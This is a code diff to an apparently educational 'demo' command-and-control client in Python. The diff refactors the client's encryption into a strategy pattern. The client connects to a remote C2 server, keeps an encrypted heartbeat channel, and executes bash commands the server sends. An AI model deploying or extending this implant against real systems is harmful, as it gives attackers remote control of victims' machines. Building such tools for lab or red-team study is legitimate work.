@@ -7,6 +7,7 @@ Features:
 - Heartbeat mechanism to maintain connection
 - Command queue for async execution
 - Support for echo, kill, and bash commands
+- Uses Strategy pattern for encryption (SOLID principles)
 """
 
 import asyncio
@@ -21,6 +22,7 @@ from datetime import datetime
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from server.protocol import ProtocolHandler
+from server.encryption_strategy import EncryptionStrategy, ECDHEncryptionStrategy
 from client.command_executor import CommandExecutor
 import config
 
@@ -35,28 +37,33 @@ class C2Client:
     """Demo C2 Client Agent"""
 
     def __init__(self, server_host: str, server_port: int,
-                 encryption_key: Optional[bytes] = None, use_ecdh: bool = True):
+                 encryption_strategy: Optional[EncryptionStrategy] = None):
         """
         Initialize C2 Client
 
         Args:
             server_host: C2 server hostname/IP
             server_port: C2 server port
-            encryption_key: Optional encryption key for secure communication (PSK mode)
-            use_ecdh: If True, use ECDH key exchange instead of PSK
+            encryption_strategy: Strategy for encryption (None = no encryption)
         """
         self.server_host = server_host
         self.server_port = server_port
-        self.use_ecdh = use_ecdh
-        self.encryption_key = encryption_key
-        self.protocol = None  # Will be initialized after connection
+        self.encryption_strategy = encryption_strategy
+        self.protocol: Optional[ProtocolHandler] = None  # Will be initialized after connection
         self.executor = CommandExecutor()
         self.client_id: Optional[str] = None
         self.reader: Optional[asyncio.StreamReader] = None
         self.writer: Optional[asyncio.StreamWriter] = None
         self.running = True
         self.command_queue: asyncio.Queue = asyncio.Queue()
-        logger.info(f"C2 Client initialized (target: {server_host}:{server_port}, encryption: {'ECDH' if use_ecdh else 'PSK' if encryption_key else 'None'})")
+
+        # Determine encryption mode for logging
+        if encryption_strategy is None:
+            mode = "None"
+        else:
+            mode = encryption_strategy.__class__.__name__.replace("EncryptionStrategy", "")
+
+        logger.info(f"C2 Client initialized (target: {server_host}:{server_port}, encryption: {mode})")
 
     async def connect(self) -> bool:
         """
@@ -72,31 +79,21 @@ class C2Client:
             )
             logger.info(f"Connected to C2 Server at {self.server_host}:{self.server_port}")
 
-            # Initialize protocol handler
-            if self.use_ecdh:
-                self.protocol = ProtocolHandler(use_ecdh=True)
-            else:
-                self.protocol = ProtocolHandler(self.encryption_key)
+            # Initialize protocol handler with encryption strategy
+            self.protocol = ProtocolHandler(self.encryption_strategy)
 
-            # Perform ECDH key exchange if enabled
-            if self.use_ecdh:
-                # Receive server's public key (32 bytes)
-                server_pubkey = await self.reader.read(32)
-                if len(server_pubkey) != 32:
-                    logger.error("Invalid server public key")
-                    return False
+            # Perform encryption handshake (e.g., ECDH key exchange)
+            if self.reader and self.writer:
+                await self.protocol.perform_handshake(self.reader, self.writer, is_server=False)
 
-                # Send client's public key
-                client_pubkey = self.protocol.get_public_key_bytes()
-                self.writer.write(client_pubkey)
-                await self.writer.drain()
-
-                # Derive shared encryption key
-                self.protocol.derive_shared_key(server_pubkey)
+            if isinstance(self.encryption_strategy, ECDHEncryptionStrategy):
                 logger.info("ECDH key exchange completed")
 
             # Receive welcome message
-            welcome = await self.protocol.read_message(self.reader)
+            if self.reader:
+                welcome = await self.protocol.read_message(self.reader)
+            else:
+                welcome = None
             if welcome and welcome.get("type") == "welcome":
                 self.client_id = welcome.get("client_id")
                 logger.info(f"Received client ID: {self.client_id}")
@@ -125,7 +122,7 @@ class C2Client:
         """Send periodic heartbeat to server (Step 4)"""
         while self.running:
             try:
-                if self.writer and not self.writer.is_closing():
+                if self.protocol and self.writer and not self.writer.is_closing():
                     await self.protocol.write_message(self.writer, {
                         "type": "heartbeat",
                         "timestamp": datetime.now().isoformat()
@@ -151,9 +148,9 @@ class C2Client:
         Args:
             message: Command message dictionary
         """
-        command_id = message.get("command_id")
-        command_type = message.get("command_type")
-        command = message.get("command")
+        command_id = message.get("command_id", "")
+        command_type = message.get("command_type", "")
+        command = message.get("command", "")
 
         logger.info(f"Processing command {command_id}: {command_type}")
 
@@ -190,13 +187,14 @@ class C2Client:
 
         # Send result back to server
         try:
-            await self.protocol.write_message(self.writer, {
-                "type": "command_result",
-                "command_id": command_id,
-                "result": result,
-                "success": success
-            })
-            logger.info(f"Sent result for command {command_id}")
+            if self.protocol and self.writer:
+                await self.protocol.write_message(self.writer, {
+                    "type": "command_result",
+                    "command_id": command_id,
+                    "result": result,
+                    "success": success
+                })
+                logger.info(f"Sent result for command {command_id}")
         except Exception as e:
             logger.error(f"Error sending result: {e}")
 
@@ -224,6 +222,10 @@ class C2Client:
         """Receive and handle messages from server"""
         try:
             while self.running:
+                if not self.protocol or not self.reader:
+                    logger.error("Protocol or reader not initialized")
+                    break
+
                 message = await self.protocol.read_message(self.reader)
 
                 if message is None:
@@ -290,10 +292,13 @@ class C2Client:
 
 async def main():
     """Main entry point for client"""
+    # Use ECDH encryption by default
+    encryption_strategy = ECDHEncryptionStrategy()
+
     client = C2Client(
         config.CLIENT_SERVER_HOST,
         config.CLIENT_SERVER_PORT,
-        use_ecdh=True  # Use ECDH key exchange instead of PSK
+        encryption_strategy=encryption_strategy
     )
 
     try:
